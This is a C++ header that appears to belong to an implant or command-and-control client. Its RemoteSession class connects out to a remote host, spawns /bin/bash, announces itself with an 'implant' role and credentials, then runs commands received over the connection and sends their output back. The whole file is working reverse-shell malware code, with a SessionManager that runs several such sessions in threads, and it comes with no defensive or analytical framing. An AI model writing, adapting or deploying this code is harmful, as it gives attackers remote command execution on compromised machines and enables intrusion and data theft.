#pragma once

#include "Logger.hpp"
#include <Remote.hpp>
#include <Shell.hpp>
#include <SessionHandshake.hpp>
#include <chrono>
#include <string>

#include <cpppwn.hpp>

//-------------------------------------------------
//
//-------------------------------------------------
class RemoteSession {
private:
    std::atomic<bool>& global_running;
    std::string host;
    int port;
    std::string session_id;
    std::string username;
    std::string password;

public:
    //-------------------------------------------------
    //
    //-------------------------------------------------
    RemoteSession(
        std::string id,
        std::string h,
        int p,
        std::string user,
        std::string pass,
        std::atomic<bool>& run)
        : global_running(run),
          host(std::move(h)),
          port(p),
          session_id(std::move(id)),
          username(std::move(user)),
          password(std::move(pass)) {}

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void run() {
        try {
            logger::debug("Session {}: Attempting connection to {}:{}", session_id, host, port);
            cpppwn::Remote conn(host, port, true, false);
            cpppwn::Process shell("/bin/bash", {"/bin/bash"});
            logger::debug("Session {}: Connection established and shell spawned.", session_id);

            session_handshake::send(conn, session_handshake::implant_role, username, password);

            logger::debug("global_running: {} | Connection: {} | Shell: {}", global_running ? "TRUE" : "FALSE", conn.is_alive() ? "TRUE" : "FALSE", shell.is_alive() ? "TRUE" : "FALSE");

            while (global_running && conn.is_alive() && shell.is_alive()) {
                const auto cmd = trim_string(conn.recvline());
                logger::debug("Shell Command: [{}]", cmd);
                shell.sendline(cmd);

                const auto output = trim_string(shell.recv_timeout(std::chrono::milliseconds(100)));
                logger::debug("Output [{}]: [{}]", output.size(), output);
                conn.sendline(std::to_string(output.size()));

                if (output.size() > 0) {
                    conn.send(output);
                }
            }
        } catch (const std::exception& e) {
            logger::debug("Session [{}] encountered error: {}", session_id, e.what());
        }
        logger::debug("Session [{}] closed.", session_id);
    }
};

//-------------------------------------------------
//
//-------------------------------------------------
class SessionManager {
private:
    struct SessionEntry {
        std::thread worker;
        std::atomic<bool> running_flag{true};
    };

    std::map<std::string, std::unique_ptr<SessionEntry>> sessions;
    std::mutex mtx;

public:
    //-------------------------------------------------
    //
    //-------------------------------------------------
    void start_session(
        const std::string& id,
        const std::string& host,
        int port,
        const std::string& username,
        const std::string& password) {
        std::lock_guard lock(mtx);
        if (sessions.contains(id)) return;

        auto entry = std::make_unique<SessionEntry>();

        // Spawn the shell thread
        entry->worker = std::thread([id, host, port, username, password, &run = entry->running_flag]() -> void {
            RemoteSession session(id, host, port, username, password, run);
            session.run();
        });

        sessions[id] = std::move(entry);
    }

    //-------------------------------------------------
    //
    //-------------------------------------------------
    void stop_sessions() {
        std::lock_guard lock(mtx);
        if (sessions.size() > 0) {
            for(auto& [id, session] : sessions) {
                session->running_flag = false;
                if (session->worker.joinable()) {
                    session->worker.detach();
                }
            }
            sessions.clear();
        }
    }
};
